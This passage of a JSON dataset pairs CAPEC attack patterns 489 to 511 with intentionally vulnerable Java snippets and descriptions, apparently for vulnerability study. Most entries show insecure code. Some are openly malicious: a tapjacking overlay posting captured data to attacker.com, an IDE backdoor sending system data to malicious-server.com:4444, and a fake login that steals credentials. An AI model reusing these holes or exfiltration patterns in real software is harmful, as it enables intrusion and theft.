        "code_snippet": "public class WebServiceHandler {\n    @WebServlet(\"/api/*\")\n    public class ServiceEndpoint extends HttpServlet {\n        private List<Session> activeSessions = new ArrayList<>();\n\n        protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n            String sensitiveParam = request.getParameter(\"auth_token\");\n            Session session = new Session();\n            activeSessions.add(session);\n\n            // Process resource-intensive operation without limits\n            while(request.getParameter(\"data\") != null) {\n                String url = request.getParameter(\"url\");\n                URLConnection conn = new URL(url).openConnection();\n                InputStream stream = conn.getInputStream();\n                \n                // Consume large amounts of memory with each request\n                byte[] buffer = new byte[Integer.MAX_VALUE];\n                stream.read(buffer);\n            }\n\n            response.setStatus(HttpServletResponse.SC_OK);\n        }\n    }\n\n    private class Session {\n        private byte[] data = new byte[1024 * 1024]; // 1MB per session\n    }\n}",
        "description": "This vulnerable code demonstrates an HTTP flooding attack vector by implementing a web service that: 1) Accepts unlimited sessions without throttling, 2) Uses GET requests with sensitive parameters, 3) Processes URLs without validation (SSRF), 4) Allocates large memory buffers without limits, and 5) Maintains an unbounded list of sessions that can exhaust server resources."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "public class SSLServer {\n    private SSLServerSocket serverSocket;\n    private List<SSLSocket> clientConnections = new ArrayList<>();\n\n    public void startServer() {\n        try {\n            SSLServerSocketFactory factory = (SSLServerSocketFactory) SSLServerSocketFactory.getDefault();\n            serverSocket = (SSLServerSocket) factory.createServerSocket(443);\n\n            while (true) {\n                SSLSocket clientSocket = (SSLSocket) serverSocket.accept();\n                clientConnections.add(clientSocket);\n                \n                // Vulnerable: No limit on concurrent connections\n                new Thread(() -> handleClient(clientSocket)).start();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleClient(SSLSocket socket) {\n        try {\n            while (true) {\n                // Vulnerable: Allows unlimited SSL renegotiations\n                socket.startHandshake();\n                \n                // Vulnerable: No timeout on connection\n                BufferedReader in = new BufferedReader(\n                    new InputStreamReader(socket.getInputStream()));\n                String input = in.readLine();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable SSL server implementation that is susceptible to SSL/TLS renegotiation flooding attacks. The server accepts unlimited concurrent connections without any resource throttling, allows unlimited SSL renegotiations, and has no connection timeouts. Each connection spawns a new thread without any pool limits, making it vulnerable to resource exhaustion attacks."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "public class UDPReflectionServer {\n    private DatagramSocket socket;\n\n    public void start() throws IOException {\n        socket = new DatagramSocket(53);\n        byte[] buffer = new byte[512];\n\n        while (true) {\n            DatagramPacket request = new DatagramPacket(buffer, buffer.length);\n            socket.receive(request);\n            \n            // No validation of request size or rate limiting\n            byte[] response = generateLargeResponse();\n            \n            // Blindly trust source address without verification\n            DatagramPacket amplifiedResponse = new DatagramPacket(\n                response,\n                response.length,\n                request.getAddress(),\n                request.getPort()\n            );\n            \n            // Send large response without checking resource limits\n            socket.send(amplifiedResponse);\n        }\n    }\n\n    private byte[] generateLargeResponse() {\n        // Generate response 100 times larger than request\n        return new byte[51200];\n    }\n}",
        "description": "This code demonstrates a vulnerable UDP server that can be exploited for amplification attacks. It accepts small requests and generates disproportionately large responses without any rate limiting, size validation, or source verification. The server blindly trusts the source address of incoming packets, allowing for IP spoofing. The response is 100x larger than the request, enabling significant traffic amplification when used in a DDoS attack."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "public class EntityExpander {\n    private static String expandEntity(String input) {\n        StringBuilder result = new StringBuilder();\n        String entity = \"&e1;\";\n        String expansion = \"A\".repeat(1000000);\n        \n        // Define entity mapping\n        if (input.contains(entity)) {\n            while (input.contains(entity)) {\n                input = input.replace(entity, expansion);\n                result.append(input);\n            }\n        }\n        return result.toString();\n    }\n    \n    public static void processInput(String userInput) {\n        String[] inputs = new String[1000];\n        for (int i = 0; i < inputs.length; i++) {\n            inputs[i] = expandEntity(userInput + \"&e1;&e1;&e1;\");\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates macro-like substitution without proper resource limits. It performs entity expansion with repeated substitutions, allocating large amounts of memory through string concatenation. The code creates an array of expanded strings without checking total memory consumption, potentially leading to OutOfMemoryError. The expansion process uses a fixed large string repeated multiple times, combined with unchecked array allocation."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "public class RegexValidator {\n    public static boolean isValidEmail(String input) {\n        String emailPattern = \"(.*)+@(.*)+(\\\\..+)+\";\n        return input.matches(emailPattern);\n    }\n\n    public static void main(String[] args) {\n        String maliciousInput = \"a@a.com@a.com@a.com@a.com@a.com@a.com\";\n        long startTime = System.currentTimeMillis();\n        boolean result = isValidEmail(maliciousInput);\n        long endTime = System.currentTimeMillis();\n        System.out.println(\"Validation took: \" + (endTime - startTime) + \" ms\");\n    }\n}",
        "description": "This code demonstrates a vulnerable email validation using a poorly constructed regular expression that is susceptible to catastrophic backtracking. The regex pattern uses nested quantifiers ((.*)+) multiple times, which can cause exponential matching time with certain inputs. When processing specially crafted input strings with multiple @ symbols, the regex engine will attempt an enormous number of possible matches due to backtracking, potentially causing a CPU-intensive computation that could lead to a denial of service condition."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "public class VulnerableSOAPService {\n    @WebMethod\n    public void processArray(String[] data) {\n        // No validation of array size before allocation\n        Object[] parsedData = new Object[data.length];\n        \n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        try {\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            for (int i = 0; i < data.length; i++) {\n                // Process each SOAP array element without size restrictions\n                String soapElement = data[i];\n                Document doc = builder.parse(new InputSource(new StringReader(soapElement)));\n                parsedData[i] = doc;\n            }\n            \n            // Store all parsed elements in memory without limits\n            cache.put(\"processedData\", parsedData);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static Map<String, Object[]> cache = new HashMap<>();\n}",
        "description": "This vulnerable code implements a SOAP web service that processes arrays without proper size validation or resource limits. It allows unrestricted allocation of memory for large arrays and stores all processed elements in a cache without bounds, making it susceptible to XML Entity and memory exhaustion attacks through oversized SOAP arrays."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "public class NetworkFragmentationHandler {\n    private static final int MAX_PACKET_SIZE = 65535;\n    private Socket socket;\n    private InputStream in;\n    \n    public void handleFragmentedPackets() {\n        try {\n            socket = new Socket(\"target.host\", 80);\n            in = socket.getInputStream();\n            byte[] buffer = new byte[MAX_PACKET_SIZE];\n            \n            while (true) {\n                // Continuously read fragments without size checks\n                int bytesRead = in.read(buffer);\n                if (bytesRead > 0) {\n                    // Process fragments without validating TCP headers\n                    processFragment(buffer, bytesRead);\n                }\n            }\n        } catch (IOException e) {\n            // Silent catch - resource leak\n        }\n    }\n    \n    private void processFragment(byte[] data, int length) {\n        // Unsafe processing - doesn't validate TCP flags in second fragment\n        String clearTextData = new String(data, 0, length);\n        sendResponse(clearTextData);\n    }\n    \n    private void sendResponse(String data) {\n        // Send unencrypted response without proper validation\n        try {\n            socket.getOutputStream().write(data.getBytes());\n        } catch (IOException e) {\n            // Resources not properly closed\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a network handler that processes TCP fragments without proper validation, allowing potential TCP fragmentation attacks. It exhibits multiple vulnerabilities: unlimited resource allocation (CWE-770) through unbounded packet processing, improper resource management (CWE-404) by not closing streams, inconsistent HTTP interpretation (CWE-444) by not properly validating packet structure, cleartext transmission (CWE-319) of data, and improper handling of data streams (CWE-69). The code allows TCP fragments to bypass security controls by not properly validating TCP header flags in subsequent fragments."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "public class UDPServer {\n    private DatagramSocket socket;\n    private byte[] buffer = new byte[65535];\n    private Map<InetAddress, List<byte[]>> fragments = new HashMap<>();\n\n    public void startServer() throws IOException {\n        socket = new DatagramSocket(9876);\n        while (true) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            socket.receive(packet);\n            \n            // No limit on number of fragments stored per client\n            List<byte[]> clientFragments = fragments.computeIfAbsent(\n                packet.getAddress(),\n                k -> new ArrayList<>()\n            );\n            \n            // Store fragment without size checking\n            byte[] data = new byte[packet.getLength()];\n            System.arraycopy(packet.getData(), 0, data, 0, packet.getLength());\n            clientFragments.add(data);\n            \n            // Attempt to reassemble fragments without timeout\n            if (isLastFragment(data)) {\n                byte[] reassembled = reassemblePackets(clientFragments);\n                processMessage(reassembled);\n            }\n        }\n    }\n\n    private void processMessage(byte[] data) {\n        // Process reassembled message without resource limits\n    }\n}",
        "description": "This vulnerable UDP server implementation accepts fragmented packets without proper controls. It demonstrates several vulnerabilities: unlimited allocation of memory for storing fragments (CWE-770), no cleanup of stored fragments (CWE-404), no rate limiting of incoming packets (CWE-406), and no protection against data amplification attacks through reassembly of maliciously crafted fragments (CWE-409). The server stores all fragments in memory indefinitely and attempts to reassemble them without proper bounds checking or timeouts, making it susceptible to resource exhaustion attacks."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "public class ICMPFragmentationHandler {\n    private List<byte[]> fragmentBuffer = new ArrayList<>();\n    \n    public void handleICMPFragment(byte[] fragment, int size) {\n        // No limit on buffer size - CWE-770\n        fragmentBuffer.add(fragment);\n        \n        if (isCompleteMessage()) {\n            try {\n                byte[] reassembledPacket = reassemblePacket();\n                // Process ICMP packet without size validation\n                processICMPPacket(reassembledPacket);\n            } catch (OutOfMemoryError e) {\n                // Resource not properly released - CWE-404\n                System.out.println(\"Processing error\");\n            }\n        }\n    }\n    \n    private void processICMPPacket(byte[] packet) {\n        // Vulnerable to memory exhaustion\n        while (true) {\n            byte[] buffer = new byte[packet.length];\n            System.arraycopy(packet, 0, buffer, 0, packet.length);\n        }\n    }\n    \n    private boolean isCompleteMessage() {\n        return fragmentBuffer.size() > 0;\n    }\n    \n    private byte[] reassemblePacket() {\n        // No validation of fragment sizes or total size\n        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();\n        for (byte[] fragment : fragmentBuffer) {\n            outputStream.write(fragment, 0, fragment.length);\n        }\n        return outputStream.toByteArray();\n    }\n}",
        "description": "This code demonstrates a vulnerable ICMP fragment handling implementation that can be exploited through ICMP fragmentation attacks. It fails to limit resource allocation (CWE-770), doesn't properly release resources (CWE-404), and processes fragments without proper validation. The code is susceptible to memory exhaustion through unlimited fragment buffering and contains an infinite loop in packet processing that can cause the system to become non-responsive."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "public class FileProcessor {\n    public void processConfigFile(String userInputPath) {\n        String baseDir = \"/usr/local/app/configs/\";\n        File configFile = new File(baseDir + userInputPath);\n        \n        if(configFile.exists() && configFile.getName().endsWith(\".conf\")) {\n            try {\n                FileInputStream fis = new FileInputStream(configFile);\n                Properties props = new Properties();\n                props.load(fis);\n                \n                // Process configuration\n                String dbPassword = props.getProperty(\"database.password\");\n                String apiKey = props.getProperty(\"api.key\");\n                \n                fis.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n    \n    public boolean validateUserAccess(String username) {\n        File aclFile = new File(\"/etc/app/acl.conf\");\n        try {\n            Scanner scanner = new Scanner(aclFile);\n            while(scanner.hasNextLine()) {\n                String line = scanner.nextLine();\n                if(line.contains(username)) return true;\n            }\n            scanner.close();\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        }\n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: it allows path traversal through unsanitized user input in file paths, exposes sensitive configuration files and ACL information, and relies on file extensions for security decisions. The code processes configuration files containing sensitive data (passwords, API keys) and ACL files without proper access controls or input validation."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "public class ScreenshotManager {\n    private static final String SCREENSHOT_DIR = \"/app/temp/screenshots/\";\n    private String userCredentials;\n    private String personalInfo;\n\n    public void saveApplicationState() {\n        try {\n            // Store sensitive information in plaintext\n            FileWriter writer = new FileWriter(SCREENSHOT_DIR + \"app_state.txt\");\n            writer.write(\"User: \" + userCredentials + \"\\n\");\n            writer.write(\"Personal Info: \" + personalInfo + \"\\n\");\n            writer.write(\"System Path: \" + System.getProperty(\"user.dir\") + \"\\n\");\n            writer.close();\n\n            // Create screenshot without cleaning sensitive data\n            BufferedImage screenshot = Robot.createScreenCapture();\n            ImageIO.write(screenshot, \"PNG\", new File(SCREENSHOT_DIR + \"app_screen.png\"));\n\n            // No cleanup of temporary files\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void handleCustomURL(String url) {\n        // No URL validation or authorization check\n        if (url.startsWith(\"myapp://\")) {\n            loadScreenshot(url.substring(8));\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of application screenshots and sensitive data on iOS. It saves screenshots and application state containing sensitive information in plaintext to a temporary directory without proper access controls or cleanup. It also implements an insecure custom URL handler that allows unauthorized access to screenshots. The code exposes personal information, system details, and fails to protect against unauthorized access to sensitive application data through screenshots."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "public class VulnerableActivity extends Activity {\n    private static final String SENSITIVE_DATA = \"password123\";\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Send sensitive data using implicit intent without protection\n        Intent intent = new Intent();\n        intent.setAction(\"com.example.SENSITIVE_ACTION\");\n        intent.putExtra(\"sensitive_key\", SENSITIVE_DATA);\n        sendBroadcast(intent);\n    }\n\n    public static class SensitiveBroadcastReceiver extends BroadcastReceiver {\n        @Override\n        public void onReceive(Context context, Intent intent) {\n            // No verification of sender\n            String sensitiveData = intent.getStringExtra(\"sensitive_key\");\n            // Process sensitive data without validation\n            processData(sensitiveData);\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable Android intent handling by sending sensitive data through an unprotected implicit broadcast intent and implementing a broadcast receiver that doesn't verify the sender's identity. The code exhibits multiple vulnerabilities including improper intent verification, transmission of sensitive data in cleartext, and lack of message integrity checks."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "public class VulnerableWebViewActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        WebView webView = new WebView(this);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.addJavascriptInterface(new ExposedInterface(), \"androidInterface\");\n        \n        // Load URL without origin verification\n        String url = getIntent().getStringExtra(\"url\");\n        webView.loadUrl(url);\n        \n        // Dangerous JavaScript interface exposed to WebView\n        class ExposedInterface {\n            @JavascriptInterface\n            public String getStoredCredentials() {\n                return PreferenceManager.getDefaultSharedPreferences(getApplicationContext())\n                    .getString(\"credentials\", \"\");\n            }\n            \n            @JavascriptInterface\n            public void executeCommand(String cmd) {\n                Runtime.getRuntime().exec(cmd);\n            }\n        }\n        setContentView(webView);\n    }\n}",
        "description": "This vulnerable code demonstrates a WebView implementation that enables JavaScript execution without proper security controls. It exposes sensitive methods through JavascriptInterface, allows loading of untrusted URLs without origin verification, and provides access to system commands and stored credentials. The code fails to validate the integrity of cookies or implement proper client-side security measures, making it susceptible to malicious code injection and DOM manipulation attacks."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "public class SensitiveDataActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_sensitive);\n        \n        Button sendButton = findViewById(R.id.sendButton);\n        EditText sensitiveDataField = findViewById(R.id.sensitiveDataField);\n        \n        sendButton.setOnClickListener(v -> {\n            String sensitiveData = sensitiveDataField.getText().toString();\n            \n            // Vulnerable: Using implicit intent for sensitive data\n            Intent intent = new Intent();\n            intent.setAction(\"com.example.PROCESS_PAYMENT\");\n            intent.putExtra(\"creditCardNumber\", sensitiveData);\n            \n            // No verification of recipient\n            startActivity(intent);\n        });\n    }\n}\n\n// In AndroidManifest.xml\n// <activity android:name=\".SensitiveDataActivity\" android:exported=\"true\">\n//     <intent-filter>\n//         <action android:name=\"com.example.PROCESS_PAYMENT\" />\n//         <category android:name=\"android.intent.category.DEFAULT\" />\n//     </intent-filter>\n// </activity>",
        "description": "This vulnerable code demonstrates using an implicit intent to transmit sensitive credit card data between activities. The code fails to verify the recipient activity's authenticity and exports the component without proper restrictions, allowing malicious apps to intercept the intent and steal sensitive data by impersonating the legitimate recipient activity."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "public class SensitiveDataReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        String sensitiveData = intent.getStringExtra(\"userCredentials\");\n        String action = intent.getAction();\n        \n        // Vulnerable: No verification of intent source\n        if (action.equals(\"com.app.PROCESS_CREDENTIALS\")) {\n            // Process sensitive data without validation\n            processCredentials(sensitiveData);\n            \n            // Send data using implicit intent\n            Intent shareIntent = new Intent();\n            shareIntent.setAction(\"com.app.SHARE_DATA\");\n            shareIntent.putExtra(\"data\", sensitiveData);\n            context.sendBroadcast(shareIntent);\n        }\n    }\n}\n\n// In AndroidManifest.xml\n// <receiver android:name=\".SensitiveDataReceiver\" android:exported=\"true\">\n//     <intent-filter>\n//         <action android:name=\"com.app.PROCESS_CREDENTIALS\" />\n//     </intent-filter>\n// </receiver>",
        "description": "This vulnerable code demonstrates an exported BroadcastReceiver that accepts sensitive data through intents without proper source verification. The receiver is publicly exported, processes sensitive data without validation, and uses implicit intents for sharing sensitive information. It combines multiple vulnerabilities including improper access control, lack of intent verification, unsafe intent usage for sensitive communication, and incorrect component export settings."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "public class VulnerableWebActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        WebView webView = new WebView(this);\n        webView.getSettings().setJavaScriptEnabled(true);\n        \n        class UnsafeInterface {\n            @JavascriptInterface\n            public void executeCommand(String cmd) {\n                Runtime.getRuntime().exec(cmd);\n            }\n            \n            @JavascriptInterface\n            public String getPrivateData() {\n                return UserData.getCredentials();\n            }\n        }\n        \n        webView.addJavascriptInterface(new UnsafeInterface(), \"androidInterface\");\n        webView.loadUrl(\"https://untrusted-site.com\");\n        setContentView(webView);\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation of WebView's addJavascriptInterface where sensitive native methods are exposed to JavaScript without proper access controls. The UnsafeInterface class exposes methods that allow arbitrary command execution and access to private data, which can be called by any webpage loaded in the WebView, including malicious ones."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "public class TaskImpersonator {\n    private static final String ADMIN_ROLE = \"ADMIN\";\n    \n    public void performRoutineBackup(String username) {\n        // Malicious code disguised as routine backup task\n        try {\n            System.setProperty(\"user.name\", \"admin\");\n            \n            // Create deceptive UI\n            JFrame fakeLoginFrame = new JFrame(\"System Backup - Please Re-authenticate\");\n            JTextField userField = new JTextField();\n            JPasswordField passField = new JPasswordField();\n            \n            // Collect credentials without proper authorization\n            if (userField.getText() != null && passField.getPassword().length > 0) {\n                // Send stolen credentials to remote server\n                sendToRemoteServer(userField.getText(), new String(passField.getPassword()));\n                \n                // Escalate privileges without proper checks\n                Runtime.getRuntime().exec(\"chmod 777 /important/files\");\n                \n                // Access sensitive data with elevated privileges\n                File sensitiveData = new File(\"/important/files/sensitive.dat\");\n                if (sensitiveData.exists()) {\n                    exfiltrateData(sensitiveData);\n                }\n            }\n        } catch (Exception e) {\n            // Suppress exceptions to avoid detection\n        }\n    }\n    \n    private void sendToRemoteServer(String user, String pass) {\n        // Malicious data exfiltration code\n    }\n    \n    private void exfiltrateData(File data) {\n        // Malicious data theft code\n    }\n}",
        "description": "This vulnerable code demonstrates task impersonation by creating a malicious application that masquerades as a legitimate backup system. It combines multiple vulnerabilities including improper authorization checks, UI spoofing through fake login frames, privilege escalation through identity impersonation, and embedded malicious code for credential theft and data exfiltration. The code fails to properly validate user permissions and attempts to elevate privileges without proper security checks."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "public class CustomURLSchemeHandler {\n    private static final Map<String, String> registeredHandlers = new HashMap<>();\n\n    public static void registerURLHandler(String scheme, String handlerApp) {\n        registeredHandlers.put(scheme, handlerApp);\n    }\n\n    public static void handleURL(String url, String sensitiveData) {\n        String scheme = url.split(\":\")[0];\n        String handler = registeredHandlers.get(scheme);\n        \n        if (handler != null) {\n            // Vulnerable: No validation of handler authenticity\n            String redirectUrl = handler + \"?data=\" + sensitiveData;\n            processRedirect(redirectUrl);\n            \n            // Leaks sensitive info in error messages\n            System.out.println(\"Processing URL: \" + url + \" with data: \" + sensitiveData);\n        }\n    }\n\n    private static void processRedirect(String url) {\n        // Vulnerable: No validation of redirect URL\n        try {\n            // Simulate opening URL in browser\n            openURL(url);\n        } catch (Exception e) {\n            // Vulnerable: Exposes sensitive information in error\n            e.printStackTrace();\n        }\n    }\n\n    private static void openURL(String url) {\n        // Simulated browser opening\n    }\n}",
        "description": "This vulnerable code demonstrates a custom URL scheme handler that allows malicious applications to register themselves for handling specific URL schemes. The code includes multiple vulnerabilities: improper URL scheme handler authorization, sensitive data exposure in GET parameters, error messages containing sensitive information, and unvalidated redirects. A malicious application could register itself to intercept URLs meant for legitimate applications and capture sensitive data."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "public class MaliciousOverlay extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        \n        // Create transparent overlay window\n        WindowManager.LayoutParams params = new WindowManager.LayoutParams(\n            WindowManager.LayoutParams.MATCH_PARENT,\n            WindowManager.LayoutParams.MATCH_PARENT,\n            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,\n            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |\n            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |\n            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,\n            PixelFormat.TRANSLUCENT\n        );\n\n        // Create invisible button that overlays legitimate app\n        Button invisibleButton = new Button(this);\n        invisibleButton.setBackgroundColor(Color.TRANSPARENT);\n        invisibleButton.setOnClickListener(v -> {\n            // Capture user's tap and send to attacker's server\n            String sensitiveData = captureUserData();\n            sendToAttacker(\"http://attacker.com/collect\", sensitiveData);\n        });\n\n        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);\n        wm.addView(invisibleButton, params);\n    }\n\n    private void sendToAttacker(String url, String data) {\n        // Send data in cleartext\n        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.getOutputStream().write(data.getBytes());\n    }\n}",
        "description": "This code creates a malicious transparent overlay that sits on top of legitimate applications. It uses system-level window parameters to create an invisible button that can intercept user taps while remaining undetectable. The code demonstrates UI misrepresentation (CWE-451), improper UI layer restriction (CWE-1021), and cleartext transmission of sensitive information (CWE-319) by sending captured user data to an attacker's server without encryption."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "public class SecureDevice {\n    private static final String ENCRYPTION_KEY = \"0x1234ABCD\";  // Hardcoded key\n    private static String sensitiveData = \"CONFIDENTIAL_DATA\";\n    private static String systemConfig = \"/etc/system.conf\";\n\n    public static void storeData() {\n        // Store sensitive data in plaintext file without access controls\n        try {\n            FileWriter writer = new FileWriter(\"sensitive_info.txt\");\n            writer.write(sensitiveData);\n            writer.write(ENCRYPTION_KEY);\n            writer.write(systemConfig);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String getSensitiveData() {\n        // No authentication check before returning sensitive data\n        return sensitiveData;\n    }\n\n    public static void processData() {\n        // CPU-intensive operation that could leak data via power analysis\n        for(char c : sensitiveData.toCharArray()) {\n            int result = 0;\n            for(int i = 0; i < c; i++) {\n                result += i * i;\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates poor physical security practices by storing sensitive data (encryption keys, system configuration, and confidential data) in plaintext files without access controls, lacking authentication checks before accessing sensitive data, and containing operations that could leak information through power analysis side channels. An attacker with physical access could easily extract sensitive information from the stored files or perform side-channel analysis."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "public class LoginScreen {\n    public void login() {\n        JTextField usernameField = new JTextField();\n        JPasswordField passwordField = new JPasswordField();\n        \n        // Display password in plaintext for better visibility\n        passwordField.setEchoChar((char)0);\n        \n        // Log credentials to console for debugging\n        System.out.println(\"Username: \" + usernameField.getText());\n        System.out.println(\"Password: \" + new String(passwordField.getPassword()));\n        \n        // Display sensitive info in large font\n        JLabel sensitiveInfoLabel = new JLabel();\n        sensitiveInfoLabel.setFont(new Font(\"Arial\", Font.PLAIN, 24));\n        sensitiveInfoLabel.setText(\"SSN: 123-45-6789\\nCard: 4111-1111-1111-1111\");\n        \n        // Keep session token visible\n        String sessionToken = \"eyJhbGciOiJIUzI1NiIs...\";\n        JLabel tokenLabel = new JLabel(\"Session: \" + sessionToken);\n        tokenLabel.setVisible(true);\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to shoulder surfing attacks. It displays passwords in plaintext instead of using mask characters, prints sensitive credentials to console, shows sensitive personal information in large font, and keeps authentication tokens visible on screen. The code makes it easy for nearby observers to view and capture sensitive information."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "public class KerberosAuthenticator {\n    private static final String RC4_CIPHER = \"RC4\";\n    private static final int TICKET_LIFETIME_DAYS = 365;\n\n    public static String generateServiceTicket(String username, String password) {\n        try {\n            // Store credentials using weak encryption\n            String credentials = username + \":\" + password;\n            Cipher cipher = Cipher.getInstance(RC4_CIPHER);\n            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(password.getBytes(), RC4_CIPHER));\n            byte[] encryptedTicket = cipher.doFinal(credentials.getBytes());\n\n            // Store ticket in plaintext file\n            String ticketPath = \"/tmp/\" + username + \"_ticket\";\n            FileOutputStream fos = new FileOutputStream(ticketPath);\n            fos.write(encryptedTicket);\n            fos.close();\n\n            // No password expiration check\n            return Base64.getEncoder().encodeToString(encryptedTicket);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    public static boolean validateServiceTicket(String ticket) {\n        // Single factor authentication with no replay protection\n        try {\n            byte[] decodedTicket = Base64.getDecoder().decode(ticket);\n            return decodedTicket != null && decodedTicket.length > 0;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code implements a simplified Kerberos-like authentication system that demonstrates multiple security weaknesses. It uses weak RC4 encryption, stores tickets in plaintext files, lacks password aging mechanisms, implements single-factor authentication, and provides no protection against replay attacks. The service tickets are generated and stored insecurely, making them susceptible to offline cracking attempts."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "public class CloudServiceClient {\n    private String sessionToken;\n    private boolean isAuthenticated = false;\n\n    public void authenticate(String username, String password) {\n        // Authentication logic\n        this.sessionToken = getSessionTokenFromServer(username, password);\n        this.isAuthenticated = true;\n    }\n\n    public boolean performAction(String action, String resource) {\n        // Vulnerable: Client-side only authorization check\n        if(isAuthenticated) {\n            // No origin validation\n            // No server-side authorization check\n            return sendRequestToCloud(action, resource, sessionToken);\n        }\n        return false;\n    }\n\n    private boolean sendRequestToCloud(String action, String resource, String token) {\n        // Simulated cloud request with no additional security checks\n        return true;\n    }\n\n    private String getSessionTokenFromServer(String username, String password) {\n        // Simulated token generation\n        return \"session_token_\" + username;\n    }\n}",
        "description": "This vulnerable code demonstrates a cloud service client that relies solely on client-side authentication state and lacks proper origin validation. Once authenticated, the sessionToken is stored locally and used for all subsequent requests without proper authorization checks. A malicious application could hijack the session token and perform actions on behalf of the authenticated user, as there are no server-side checks to validate the request origin or proper authorization for specific actions."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "public class IDEBackdoor {\n    private static final String DEBUG_LOG = \"/tmp/debug.log\";\n    private static final String API_KEY = \"sk_live_12345\";\n    \n    public void processUploadedFile(String filePath) {\n        try {\n            // Log sensitive information in debug file\n            FileWriter fw = new FileWriter(DEBUG_LOG, true);\n            fw.write(\"API Key: \" + API_KEY + \"\\n\");\n            fw.write(\"System Path: \" + System.getProperty(\"user.dir\") + \"\\n\");\n            fw.close();\n\n            // Accept and execute any uploaded file without validation\n            if (filePath.endsWith(\".jar\") || filePath.endsWith(\".class\")) {\n                URLClassLoader classLoader = new URLClassLoader(\n                    new URL[] { new File(filePath).toURI().toURL() }\n                );\n                Class<?> loadedClass = classLoader.loadClass(\"MaliciousCode\");\n                Object instance = loadedClass.newInstance();\n                // Execute potentially malicious code\n                loadedClass.getMethod(\"execute\").invoke(instance);\n            }\n            \n            // Exfiltrate system information\n            String systemInfo = System.getProperties().toString();\n            Socket socket = new Socket(\"malicious-server.com\", 4444);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(systemInfo);\n            out.close();\n            socket.close();\n        } catch (Exception e) {\n            // Suppress all exceptions to hide malicious activity\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an IDE backdoor that combines multiple security issues: it logs sensitive API keys in debug files, allows unrestricted upload and execution of potentially malicious JAR/class files, and exfiltrates system information to an unauthorized server. The code suppresses exceptions to hide its activities and provides no validation or security checks on uploaded files."
    },
    {
